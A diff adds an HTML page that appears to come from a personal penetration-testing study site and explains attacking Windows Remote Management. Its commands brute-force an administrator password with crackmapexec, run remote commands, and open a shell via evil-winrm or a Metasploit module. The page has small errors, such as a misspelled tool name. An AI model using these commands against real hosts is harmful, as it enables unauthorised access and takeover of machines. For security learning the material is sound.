@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./pts.css">
+    <title>system and host attacks exploiting winrm</title>
+</head>
+<body>
+    <header class="navbar">
+        <a href="https://github.com/puzz00" target="_blank"><img src="./images/chess_1.jpg" alt="black or white?"></a>
+        <h1>winrm</h1>
+        <nav class="links">
+            <ul>
+                <li><a href="./index.html">home</a></li>
+                <li><a href="./host_and_network_pen_testing.html">host and network</a></li>
+                <li><a href="./system_and_host_attacks.html">system and host attacks</a></li>
+                <li><a href="./win_vulns.html">win vulns</a></li>
+                <li><a class="active" href="#">winrm</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="main-content">
+        <h2>WinRM</h2>
+        <p>
+            This is the Windows Remote Management Protocol and it lets people execute commands on a windows box remotely via the internet or an internal network. Windows Remote Management is often used by system administrators to manage hosts on a network remotely. They can use valid credentials and then interact with the remote machines which have winrm enabled - it is not enabled by default. This service runs on port 5985 with http or 5986 with https.
+        </p>
+        <h2>Credentials</h2>
+        <p>
+            We need valid credentials so a brute force attack using crackmapexec is a good start point. We can narrow down our search to users we have enumerated or the default windows accounts such as administrator: <code>sudo crackmapexed winrm 10.2.18.45 -u administrator -p rockyou.txt</code> If we have found valid credentials for other services such as smb or rdp, it is worth trying them with rdp just in case the user has reused their password.
+        </p>
+        <h2>Exploitation</h2>
+        <p>
+            Once we have found valid credentials, we can run commands using the winrm service through crackmapexec: <code>sudo crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "systeminfo"</code>
+        </p>
+        <p>
+            We can get a shell using: <code>sudo evil-winrm.rb -u administrator -p tinkerbell -i 10.2.18.45</code> or <code>use exploit/windows/winrm/winrm_script_exec</code> (this one uses msfconsole - we need to set the usual options but also set FORCE_VBS true).
+        </p>
+        <h2>Conclusion</h2>
+        <p>
+            WinRM is another native service on windows which provides us with a vector to attack if we find it is up and running.
+        </p>
+    </section>
+    <section class="extra-info">
+        <p class="tagline">
+            the enemy knows the system
+        </p>
+        <div class="contact">
+            <p>puzz00</p>
+            <a href="https://github.com/puzz00" class="active" target="_blank">knock knock</a>
+        </div>
+    </section>
+</body>
+</html>
